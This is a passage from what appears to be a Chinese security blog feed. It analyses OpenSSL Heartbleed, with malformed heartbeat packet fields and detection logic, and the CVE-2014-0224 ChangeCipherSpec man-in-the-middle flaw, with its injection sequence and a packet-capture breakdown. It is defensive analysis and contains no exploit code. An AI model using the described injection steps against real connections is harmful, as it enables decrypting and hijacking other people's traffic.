02表示heartbeat_response</td></tr><tr><td>payload_length</td><td>2bytes</td><td>payload长度</td></tr><tr><td>payload</td><td>payload_length个bytes</td><td>payload的具体内容</td></tr><tr><td>padding</td><td>&gt;=16bytes</td><td>padding填充，最少为16个字节</td></tr></tbody></table><p>​        如下图所示，心跳包标识（\x18），SSL协议标识（\x03\x03），Heartbeat Message的length为3字节（\x00\x03），而请求数据字段（payload length）的值为65535字节（\xff\xff），有可能存在攻击，因为攻击者想获得更多的信息，所以一般请求数据长度（payload length）设置为最大值65535（\xff\xff），而且wireshark一般会对畸形心跳包进行标识，显示此Heartbeat Request数据包的payload length异常。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/1.png"></p><h2 id="攻击流程示例"><a href="#攻击流程示例" class="headerlink" title="攻击流程示例"></a>攻击流程示例</h2><p><strong>心跳请求包</strong></p><p>​        攻击者发送特征的心跳请求包，是只设置了payload length，但是<strong>没有payload数据</strong>。Heartbeat Message的length为3字节（\x00\x03）说明没有payload数据，而请求数据字段（payload length）的值为16384字节（\x40\x00），说明请求服务器返回16384字节长度的心跳返回包数据。而且wireshark一般会对畸形心跳包进行标识，显示此Heartbeat Request数据包的payload length异常。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/3.png"></p><p><strong>心跳响应包</strong></p><p>​        受漏洞影响的服务器一般会返回，攻击者发送的心跳请求包的请求数据字段（payload length）相同大小的数据，此次为16384字节。可以看到泄漏的数据为16384字节。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/2.png"></p><h2 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h2><p>​        OpenSSL心脏滴血（CVE-2014-0160）一般的检测思路是从泄漏角度来判断匹配的是心跳响应数据包，一般返回的心跳包不会很大，如果超过返回的心跳数据大于16384字节，可能在泄漏内存数据。但是存在一种加密的心跳响应数据包，虽然TLS协议已经规定TLSCiphertext.fragment 的长度（以字节为单位）不能超过2^14 + 2048（16384 + 2048字节长度）。但是，实际的部分场景中存在，加密心跳响应数据包的长度超过规定值，所以存在误报。</p><p>​        由于心跳数据包被加密如果攻击者无主密钥也无法解密。一般明文的心跳数据包，误报的可能性较低。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/4.png"></p><p>​        另一种检测思路是从心跳请求包角度来判断，不仅判断心跳请求包长度（length），并且对请求数据长度字段值（payload length）大小判断，可信度较高，误报可能性较低。</p><h2 id="判断总结"><a href="#判断总结" class="headerlink" title="判断总结"></a>判断总结</h2><p>  OpenSSL心脏滴血（CVE-2014-0160）的产生主要由于OpenSSL的心跳处理逻辑没有检测心跳包中的长度字段（payload length）是否和后续实际的数据内容长度（payload）相对应，导致攻击者构造异常数据包，来直接获取心跳数据所在的内存区域的后续数据。主要特征有：</p><ul><li>heartbleed漏洞主要存在于有心跳机制的OpenSSL协议中。</li><li>IANA组织把开启心跳扩展机制的SSL数据包type类型定义为24（0x18）。</li><li>heartbleed漏洞主要存在于TLS和DTLS两种协议中，在含有heartbleed漏洞的OpenSSL协议中需要开启心跳扩展机制（beartbeat），而含有心跳扩展机制的TLS版本主要包含在TLSv1.0（0x0301），TLSv1.1（0x0302），TLSv1.2（0x0303）三种版本中。</li><li>heartbleed漏洞攻击主要由于攻击者构造异常的心跳数据包，即心跳包中的长度字段（payload length）与后续实际的数据内容长度（payload）不相符合，来获取心跳数据所在的内存区域的后续数据。</li></ul><p>​        综上所述我们可以通过对线网中的数据首先进行判断是否为含有OpenSSL的数据包，同时通过对数据包中的type类型判断数据包是否为心跳数据包（\x18），然后对TLS的版本进行匹配找到相应的含有心跳扩展机制的心跳数据包，最后通过对心跳包中的实际数据长度（payload）与长度字段（payload length）定义的值比较，如果心跳包中的与后续实际的数据内容长度（payload）小于定义的长度字段（payload length）则该数据包即为含有heartbleed漏洞的数据包。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​        OpenSSL是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议。OpenSSL 1.0.1中的TLS和DTLS在实现上没有严格处理Heartbeat扩展包，心跳处理逻辑没有检测心跳包中的长度字</summary>
      
    
    
    
    <category term="漏洞相关" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="OpenSSL" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/"/>
    
    
    <category term="OpenSSL" scheme="http://example.com/tags/OpenSSL/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2014-0224_OpenSSL中间人漏洞</title>
    <link href="http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T06:54:14.000Z</published>
    <updated>2021-07-06T07:22:39.639Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSL-TLS协议简介"><a href="#SSL-TLS协议简介" class="headerlink" title="SSL/TLS协议简介"></a>SSL/TLS协议简介</h2><p>安全套接字层（SSL）和传输层安全性（TLS）是加密协议，通过TCP/IP网络进行的通信提供安全的身份验证和数据完整性。 </p><p>通过使用如对称密钥密码，加密安全哈希函数以及非对称加密/解密和身份验证的公钥基础结构之类的加密原语，这些协议使主机能够在不安全的网络上，建立安全信道。 </p><p>TLS 1.1和TLS 1.2 是IETF标准，并且是对TLS 1.0的改进，而TLS 1.0本身是Netscape开发的SSL协议（版本3.0）的标准化后继版本。</p><p>TLS是一个分层协议。 两个端点之间交换的所有数据都包含在TLS记录内，TLS记录是协议堆栈的最底层。 TLS结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Offset Length Content</span><br><span class="line">---------------------------------------</span><br><span class="line">0x00 1 Record Type</span><br><span class="line">0x01 2 Record Version</span><br><span class="line">0x03 2 Length of Record Data (n)</span><br><span class="line">0x05 n Record Data</span><br></pre></td></tr></table></figure><p>TLS是按big-endian字节顺序排列。 </p><p>不同版本的SSL的Record Version对应如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x03\x00//SSL 3.0</span><br><span class="line">\x03\x01//TLS 1.0</span><br><span class="line">\x03\x02//TLS 1.1</span><br><span class="line">\x03\x03//TLS 1.2</span><br></pre></td></tr></table></figure><p>注意，在大多数应用程序中，默认情况下SSL 2.0没有Record层，已被弃用并禁用。 </p><p>TLS支持几种记录类型（Record Type）：</p><p>包括握手协议（\x16），更改密码规范协议（\x14），警报协议（\x15）和应用程序数据协议（\x17）。</p><p>客户端和服务器使用握手协议来协商通用密钥，交换密钥数据并验证握手过程的完整性。 更改密码规范协议（\x14）消息用于初始化两端的密码。 建立TLS会话后，所有TLS消息的记录数据（Record Data）部分都会使用协商密钥加密。</p><p>握手协议的记录数据（Record Data）字段具有以下格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Offset Length Content</span><br><span class="line">---------------------------------------</span><br><span class="line">0x00 1 Handshake Type</span><br><span class="line">0x01 3 Length (n)</span><br><span class="line">0x04 n Handshake Data</span><br></pre></td></tr></table></figure><p>存在几种类型的握手消息类型（Handshake Type），包括Client Hello（\x01），Server Hello（\x02），Hello Verify Request（\ x03），Certificate（\ x0b），Server Hello Done（\ x0e），Client Key Exchange（\ x10） ，Finished（\ x14）等，</p><p>每个都有自己的结构。 </p><p>注：Change Cipher Spec 消息具有记录类型（\x14），记录数据长度（\x01）和记录数据（\x01），这是固定消息。</p><p><strong>TLS 握手：</strong></p><p>SSL/TLS对于传输层的加密是通过动态密钥对数据进行加密实现的，而动态密钥则通过握手流程协商制定；为了保证动态密钥的安全性，其中使用公钥加密算法（非对称）、数字证书签名等手段。</p><p>一个SSL/TLS 握手过程需要协商的信息包括：</p><ul><li> 协议的版本号；</li><li> 加密算法，包括非对称加密算法、动态密钥算法；</li><li> 数字证书，传输双方通过交换证书及签名校验对彼此进行鉴权；</li><li> 动态密钥，传输数据过程使用该密钥进行对称加解密，该密钥通过非对称密钥进行加密传输。</li></ul><p>客户端和服务器之间的以下消息流描述了正常的TLS握手（标记为带星号的是可选的）：</p><p><strong>TLS消息流程图</strong></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/18.png"></p><p><strong>简单说明流程图：</strong></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/20.png"></p><p><strong>注意：</strong>握手协议作为SSL的一个子协议，在实现过程中是一个状态机。但握手协议中Change Cipher Spec（更改密钥规格）并不是一个握手消息，而是一个独立的TLS子协议类型。对此做法的官方解释是为了避免流水线推迟。OpenSSL中间人漏洞的发现者Masashi Kikuchi认为这种设计是漏洞成因之一。</p><ol><li><p>客户端发出一个 Client Hello 消息，携带的信息包括：</p><p>所支持的SSL/TLS 版本列表；支持的与加密算法；所支持的数据压缩方法；随机数A;</p></li><li><p>服务端响应一个 Server Hello 消息，携带的信息包括：</p><p>协商采用的SSL/TLS 版本号；会话ID；随机数B；服务端数字证书 ServerCA；</p><p>由于双向认证需求，服务端需要对客户端进行认证，会同时发送一个 Client Certificate Request，表示请求客户端的证书；</p></li><li><p>客户端校验服务端的数字证书；校验通过之后发送随机数C，该随机数称为预主密钥（premaster key），使用服务器的数字证书中的公钥加密后发出；</p><p>由于服务端发起了 Client Certificate Request，客户端使用私钥加密一个随机数 ClientRandom随客户端的证书 ClientCA一并发出；</p></li><li><p>服务端校验客户端的证书，并成功将客户端加密的随机数ClientRandom 解密；</p><p>根据随机数A/随机数B/随机数C（premaster key）产生动态密钥（master-key），加密一个Finish 消息发至客户端；</p></li><li><p>客户端根据 同样的随机数和算法生成动态密钥（master-key），加密一个Finish 消息发送至服务端；</p></li><li><p>服务端和客户端分别解密成功，至此握手完成，之后的数据包均采用生成动态密钥（master-key）进行加密传输。</p></li></ol><p><strong>Client Key Exchange 消息说明</strong></p><p>Client Key Exchange 消息包含用于生成密钥的最后一条加密信息：使用服务器的公钥加密的预主密钥（premaster key）。客户端生成的预主密钥（premaster key）只能由服务器解密，并防止中间人窃听。两端都使用预主密钥（premaster key）来生成主密钥（master key）。然后，将主密钥（master key）和公开可用的Client Hello和Server Hello的随机值A/随机值B，一起用作密钥扩展伪随机函数的输入，以生成密钥块。然后，将来自密钥块的字节分配给各种加密，解密，IV和MAC密钥，所有这些仅客户机和服务器共享。</p><p><strong>Change Cipher Spec消息说明</strong></p><p>注意Change Cipher Spec消息是如何使用的：客户端在收到服务器Hello Done消息后，生成预主密钥（premaster key），主密钥（master key）和最后的密钥块，发送Client Key Exchange消息，然后才发送Change Cipher Spec消息。服务器发送其Change Cipher Spec收到并验证来自客户端的Finished消息。在每一端，均使用Change Cipher Spec消息来初始化密码，并另一端所有其他TLS数据将受到刚刚协商的密码的保护。</p><p><strong>双向认证和单向认证说明</strong></p><p>双向认证更好的解决了身份冒充问题，服务端提供证书的同时要求对客户端身份进行认证；但是在一些常见的应用场景下往往只有单向认证，如采用https网站只需要求客户端（浏览器）对服务端的证书进行认证。</p><p>在单向认证场景下，握手阶段2服务端不会发出 Client Certificate Request，之后服务端也不需要校验客户端证书；</p><p>在双向认证场景下，客户端如果无法提供证书，会发出 no digital certificate alert 的警告信息，此时可能导致握手失败；</p><p><strong>随机数的使用说明</strong></p><p>由于数字证书是静态的，因此要求使用随机因素来保证协商密钥的随机性；对于RSA 算法来说，预主密钥（premaster key）本身就是一个随机数，再加上Hello消息中的随机数，三个随机数通过一个密钥导出器最终导出一个对称密钥。</p><p>之所以采用 预主密钥（premaster key）机制是因为SSL协议不信任每个主机都能产生完全随机的随机数，如果预主密钥（premaster key）不随机，那么被猜出来的风险就很大，于是仅仅使用 预主密钥（premaster key）作为密钥不合适，需要引入新的随机因素，也就是同时结合hello消息中的双向随机数。</p><p><strong>会话密钥重用说明</strong></p><p>SSL/TLS握手过程比较繁琐，同时非对称加解密性能比对称密钥要差得多；如果每次重建连接时都需要进行一次握手会产生较大开销，因此有必要实现会话的重用以提高性能。</p><p><strong>常用的方式包括：</strong></p><p>SessionID(RFC 5246)，客户端和服务端同时维护一个会话ID和会话数据状态；重建连接时双方根据sessionID找到之前的会话密钥实现重用；</p><p>SessionTicket(RFC 5077)，由服务端根据会话状态生成一个加密的ticket，并将key也发给客户端保证两端都可以对其进行解密。该机制相较sessionID的方式更加轻量级，服务端不需要存储会话状态数据，可减轻一定压力。</p><p><strong>证书的校验说明</strong></p><ol><li><p>检查数字签名；</p></li><li><p>CA链授权检查；</p></li><li><p>证书过期及激活时间检查；</p></li></ol><h2 id="SSL-TLS协议握手过程"><a href="#SSL-TLS协议握手过程" class="headerlink" title="SSL/TLS协议握手过程"></a>SSL/TLS协议握手过程</h2><p>SSL的握手过程严格说是SSL协议的子协议，RFC5246(SSL V1.2）分为三个子协议，握手协议，记录协议（加密传输数据）和告警协议（用于告警和关闭连接）。握手过程实际就是握手协议的内容。</p><p>下图为一个单向认证的握手过程，13为客户端，55为服务端。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/1.png"></p><p><strong>一、客户端向服务端发送</strong></p><p><strong>Client Hello</strong></p><p>支持的协议版本，比如TLS 1.2</p><p>支持的加密算法(Cipher Suties)</p><p>客户端生成的随机数A</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/2.png"></p><p><strong>二、服务端向客户端发送</strong></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/6.png"></p><p><strong>Server Hello</strong></p><p>确认使用的协议版本</p><p>服务器生成的随机数B</p><p>session id</p><p>确认使用的加密算法</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/3.png"></p><p><strong>Certificate</strong><br>服务器证书</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/4.png"></p><p><strong>Server Key Exchange</strong><br>如果是DH算法，这里发送服务器使用的DH参数。RSA算法不需要这一步。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/5.png"></p><p><strong>Server Hello Done</strong></p><p>Server Hello结束。因为采用单向认证所以没有Certificate Request</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/7.png"></p><p><strong>三、客户端向服务端发送</strong></p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/8.png"></p><p><strong>Client Key Exchange</strong></p><p>包含预主密钥（premaster key）。客户端生成第三个随机数。如果是采用RSA算法，会生成一个48字节随机数，然后用服务端的公钥加密之后再放入报文中；如果是DH算法，这里发送的就是客户端的DH参数，之后服务器和客户端根据DH算法，各自计算出相同的预主密钥（premaster key）。因为采用单向认证，所以不会发送Certificate Verify消息。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/9.png"></p><p><strong>Change Cipher Spec</strong></p><p>客户端通知服务器开始使用加密方式发送报文。客户端使用上面的3个随机数client random, server random, premaster key, 计算出48字节的主密钥master secret, 这个就是对称加密算法的密钥。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/10.png"></p><p><strong>Finished</strong></p><p>客户端发送第一个加密报文。使用HMAC算法计算收到和发送的所有握手消息的摘要，然后通过RFC5246中定义的一个伪函数PRF计算出结果，加密后发送。Finished是上图的Encrypted Handshake Message。</p><p><strong>四、服务端向客户端发送</strong></p><p>服务器端发送<strong>Change Cipher Spec</strong>和<strong>Finished</strong>消息，到这里握手结束。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="OpenSSL中间人漏洞"><a href="#OpenSSL中间人漏洞" class="headerlink" title="OpenSSL中间人漏洞"></a>OpenSSL中间人漏洞</h2><p>OpenSSL中间人漏洞（CVE-2014-0224）。 该漏洞是由于在处理Change Cipher Spec消息时的OpenSSL方法存在缺陷。 未经身份验证的中间人攻击者可以通过使用特制握手强制使用弱密钥来利用此漏洞。 成功的利用将使攻击者能够解密流量并将纯文本注入TLS连接。</p><p>漏洞影响版本：</p><ul><li>OpenSSL Project OpenSSL prior to 0.9.8za</li><li>OpenSSL Project OpenSSL prior to 1.0.0m</li><li>OpenSSL Project OpenSSL prior to 1.0.1h</li></ul><p>远程未经身份验证的中间人（MITM）攻击者可以利用此漏洞来解密和注入流量。当OpenSSL客户端和服务器尝试执行TLS握手时，中间人（MITM）会拦截并将Client Hello转发到服务器。攻击者然后从服务器截获Server Hello，服务器Certificate和Server Hello Done消息，再将Server Hello消息转发到客户端，然后在转发服务器 Certificate和Server Hello Done消息之前，注入Change Cipher Spec消息。</p><p>注意：也有可能在服务器Certificate之后，但在Server Hello Done之前发送Change Cipher Spec记录消息。</p><p>客户端在收到这些Change Cipher Spec消息后会初始化弱密码（主密钥为空），并以Client Key Exchange，Change Cipher Spec和Finished消息进行响应。在将Client Key Exchange和Finished的消息发送到服务器之前，中间人（MITM）再次拦截这些消息，并注入自己的Change Cipher Spec记录消息。当服务器在Client Key Exchange之前收到中间人（MITM）发送的Change Cipher Spec消息时，它会初始化相同的弱密码（主密钥为空），然后处理Client Key Exchange消息以更新其主密钥，并最终计算正确的verify_data，处理Finished消息。然后，服务器使用自己的Change Cipher Spec和Finished消息作为响应，中间人（MITM）将其拦截，重新加密并转发给客户端。客户端接受这些消息，从而使用可公开计算的密码与服务器建立TLS会话，攻击者可利用该密码解密数据或注入有效的加密数据流，进行会话劫持。</p><p>注意：在上述攻击情形中，中间人（MITM）攻击者需要使用弱密码对通常为纯文本消息（例如Server Hello Done，Client Key Exchange等）进行加密，然后再将它们从一端转移到另一端。</p><h2 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h2><ul><li>目标客户端和服务器必须已安装并正在运行该产品的易受攻击的版本。</li><li>攻击者必须能够拦截数据包并将其注入目标主机之间的传输层连接中。</li></ul><p>中间攻击者的人将来自客户端的Client Hello数据包转发到服务器。 然后，攻击者从服务器截获Server Hello，Certificate和Server Hello Done消息，并在转发Server Hello之后，在Server Certificate和Server Hello Done消息之前，发送恶意的Change Cipher Spec记录。 然后，攻击者拦截客户端的Client Key Exchange，Change Cipher Spec和Finished消息，然后向服务器发送恶意的Change Cipher Spec记录，然后发送Client Key Exchange和Finished消息。 然后，攻击者拦截并加密服务器的Change Cipher Spec和Finished消息，发送到客户端，从而成功建立了具有弱密码的TLS会话。</p><h2 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h2><p>客户端向服务器发送Client Hello。 中间人（MITM）将其转发到服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Client] ------------&gt; [MITM] -----------&gt; [Server]</span><br></pre></td></tr></table></figure><p>服务器向中间人（MITM）发送Server Hello，Certificate 和 Server Hello Done：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Client]    [MITM] &lt;----------- [Server]</span><br></pre></td></tr></table></figure><p>中间人（MITM）转发Server Hello，注入Change Cipher Spec，并将服务器Certificate和Server Hello Done发送给客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Client] &lt;------------ [MITM]    [Server]</span><br></pre></td></tr></table></figure><p>客户端向中间人（MITM）发送 Client Key Exchange，Change Cipher Spec和Finished消息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Client] ------------&gt; [MITM]    [Server]</span><br></pre></td></tr></table></figure><p>中间人（MITM）将Change Cipher Spec，Client Key Exchange和Finished消息发送到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Client]    [MITM] ------------&gt; [Server]</span><br></pre></td></tr></table></figure><p>服务器发送其Change Cipher Spec和Finished消息，而中间人（MITM）会将其加密并发送给客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Client] &lt;------------ [MITM] &lt;------------ [Server]</span><br></pre></td></tr></table></figure><h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><p>230为客户端，206为中间人，164为服务器，整个中间人劫持流程配合数据包分析如下：</p><p>客户端（230）发送Client Hello。 中间人（206）截获了它；</p><p>中间人（206）将Client Hello转发到服务器（164）；</p><p>服务器（164）发送Serve Hello， Certificate和Server Hello Done响应， 中间人（206）截获了它；</p><p>中间人（206）将Server Hello，恶意Change Cipher Spec和（加密的） Certificate以及（加密的）Server Hello Done发送给客户端（230）：</p><p>客户端（230）发送Client Key Exchange，Change Cipher Spec和（加密的）Finished消息，中间人（206）截获了它。</p><p>中间人（206）发送恶意的Change Cipher Spec，然后发送（加密的）Client Key Exchange和（加密的）Finished消息：</p><p>服务器（164）以Change Cipher Spec和（已加密）Finished消息作为响应，中间人（206）截获了它：</p><p>中间人（206）向客户端（230）发送（加密的）Change Cipher Spec和（加密的）Finished消息。</p><p>整个劫持流程结束。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/12.png"></p><p>分析客户端（230）与中间人（206）的通信。</p><p>客户端（230）发送Client Hello给中间人（206）；</p><p>中间人（206）将Server Hello，恶意Change Cipher Spec和（加密的） Certificate以及（加密的）Server Hello Done发送给客户端（230）；</p><p>客户端（230）发送Client Key Exchange，Change Cipher Spec和（加密的）Finished消息给中间人（206）；</p><p>中间人（206）向客户端（230）发送（加密的）Change Cipher Spec和（加密的）Finished消息；</p><p>之后中间人（206）开始发送Application Data给客户端（230）。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/13.png"></p><p>下图是客户端（230）与中间人（206）通信与正常的SSL协议握手过程的对比图。</p><p>明显可以发现，客户端（230）与中间人（206）的通信中缺少服务器发送的Certificate和Server Key Exchange和Server Hello Done的消息。因为中间人（206）截获消息向服务器发送了恶意Change Cipher Spec在Server Hello之后，在服务器Certificate和Server Hello Done消息之前。所以无需Server Key Exchange，让服务器强制使用空密钥生成之后的对称密钥。而且，中间人（206）已经使用Client Hello和Server Hello的随机值与空预主密钥生成之后的对称密钥，来加密 Certificate和Server Hello Done并发送给客户端（230）。所以，在数据包中体现为Encrypted Handshake Message类型消息。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/16.png"></p><p>分析中间人（206）与服务器（164）的通信。</p><p>中间人（206）将Client Hello转发到服务器（164）；</p><p>服务器（164）发送Serve Hello， Certificate和Server Hello Done响应给中间人（206）；</p><p>中间人（206）发送恶意的Change Cipher Spec，然后发送（加密的）Client Key Exchange和（加密的）Finished消息；</p><p>服务器（164）以Change Cipher Spec和（已加密）Finished消息作为响应给中间人（206）；</p><p>之后服务器（164）开始发送Application Data给中间人（206）。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/14.png"></p><p>下图是中间人（206）与服务器（164）的通信与正常的SSL协议握手过程的对比图。</p><p>明显可以发现，中间人（206）与服务器（164）的通信缺少客户端发送的Client Key Exchange的消息。因为中间人（206）截获消息向服务器发（164）送了恶意Change Cipher Spec，中间人（206）只需Client Hello和Server Hello的随机值与空预主密钥生成之后的对称密钥。利用生成的对称密钥加密发送Client Key Exchange和客户端（203）的Finished消息。在数据包中体现为Encrypted Handshake Message类型消息。</p><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/15.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​        OpenSSL中存在一个安全绕过漏洞。该漏洞存在于处理OpenSSL客户端和服务端上的Change Cipher Spec消息。 </p><p>​        握手协议作为SSL的一个子协议，在实现过程中是一个状态机。但握手协议中Change Cipher Spec（更改密钥规格）并不是一个握手消息，而是一个独立的TLS子协议类型。对此做法的官方解释是为了避免流程推迟。该漏洞的发现者Masashi Kikuchi认为这种设计是漏洞成因之一。</p><p>​        在整个握手协议中，也没有强制对Change Cipher Spec的发送顺序做任何校验，那么中间人攻击者有机会在握手过程中的任何时机插入Change Cipher Spec消息。一种可能的攻击方法就是，在计算出master、生成对称密钥之前，就插入Change Cipher Spec消息。这将导致消息接收方以全空的主密钥生成对称密钥。那么中间人有机会完全窃听通信过程中的加密数据。</p><p>​        ssl3_read_bytes（）用于处理传入的数据。收到Change Cipher Spec类型的数据时，ssl3_read_bytes（）首先检查s-&gt; s3-&gt; tmp.new_cipher（用于临时存储密码参数的结构）是否为NULL，如果未设置，则设置s-&gt; s3-&gt; change_cipher_spec并调用ssl3_do_change_cipher_spec（ ）。每当接收到ChangeCipherSpec消息时，便会执行此操作。</p><p>​        ssl3_do_change_cipher_spec（）首先检查临时密码的密钥块s-&gt;s3-&gt;tmp.key_block是否为NULL，如果是，则继续使用ssl3_generate_key_block（）或tls1_generate_key_block（）的setup_key_block（）从主密钥，Client Hello，Server Hello的随机值计算密钥块。</p><p>​        这两个函数都使用s-&gt; session-&gt; master_key（已初始化为0）作为其主密钥，因此最终仅基于Client Hello和Server Hello随机值生成密钥块。</p><p>​        